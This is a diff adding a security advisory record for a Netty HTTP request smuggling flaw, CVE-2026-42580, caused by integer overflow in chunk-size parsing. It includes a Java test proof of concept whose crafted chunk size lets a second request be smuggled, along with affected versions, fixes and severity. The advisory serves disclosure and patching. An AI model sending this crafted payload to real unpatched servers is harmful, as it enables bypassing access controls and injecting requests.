@@ -1,0 +1,94 @@
+advisory_id: GHSA-m4cv-j2px-7723
+datasource_id: github_osv_importer_v2/GHSA-m4cv-j2px-7723
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-m4cv-j2px-7723/GHSA-m4cv-j2px-7723.json
+aliases:
+  - CVE-2026-42580
+summary: |
+  Netty vulnerable to HTTP Request Smuggling due to incorrect chunk size parsing
+  ### Summary
+  Netty's chunk size parser silently overflows int, enabling request smuggling attacks.
+
+  ### Details
+  io.netty.handler.codec.http.HttpObjectDecoder#getChunkSize silently overflows int.
+
+  The size is accumulated as follows:
+
+  result *= 16;
+  result += digit;
+
+  The result is checked only for negative values. However, with a carefully crafted chunk size, the result can be a valid size.
+
+  ### PoC
+  The test below shows Netty successfully parsing the second request, demonstrating how an attacker can smuggle a second request inside a chunked body.
+
+  ```java
+  @Test
+  public void test() {
+      String requestStr = "POST / HTTP/1.1\r\n" +
+              "Host: localhost\r\n" +
+              "Transfer-Encoding: chunked\r\n\r\n" +
+              "100000004\r\n" +
+              "test\r\n" +
+              "0\r\n" +
+              "\r\n" +
+              "GET /smuggled HTTP/1.1\r\n" +
+              "Host: localhost\r\n" +
+              "Content-Length: 0\r\n" +
+              "\r\n";
+
+      EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
+      assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
+
+      // Request 1
+      HttpRequest request = channel.readInbound();
+      assertTrue(request.decoderResult().isSuccess());
+      HttpContent content = channel.readInbound();
+      assertTrue(content.decoderResult().isSuccess());
+      assertEquals("test", content.content().toString(CharsetUtil.US_ASCII));
+      content.release();
+      LastHttpContent last = channel.readInbound();
+      assertTrue(last.decoderResult().isSuccess());
+      last.release();
+
+      // Request 2
+      request = channel.readInbound();
+      assertTrue(request.decoderResult().isSuccess());
+      last = channel.readInbound();
+      assertTrue(last.decoderResult().isSuccess());
+      last.release();
+  }
+  ```
+
+  ### Impact
+  HTTP Request Smuggling: Attacker injects arbitrary HTTP requests
+impacted_packages:
+  - purl: pkg:maven/io.netty/netty-codec-http
+    affected_versions: vers:maven/<=4.2.12.Final
+    fixed_versions: vers:maven/4.2.13.Final
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:maven/io.netty/netty-codec-http
+    affected_versions: vers:maven/<=4.1.132.Final
+    fixed_versions: vers:maven/4.1.133.Final
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '6.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-m4cv-j2px-7723/GHSA-m4cv-j2px-7723.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-444
+references:
+  - url: https://github.com/netty/netty
+    reference_type:
+    reference_id:
+  - url: https://github.com/netty/netty/security/advisories/GHSA-m4cv-j2px-7723
+    reference_type:
+    reference_id:
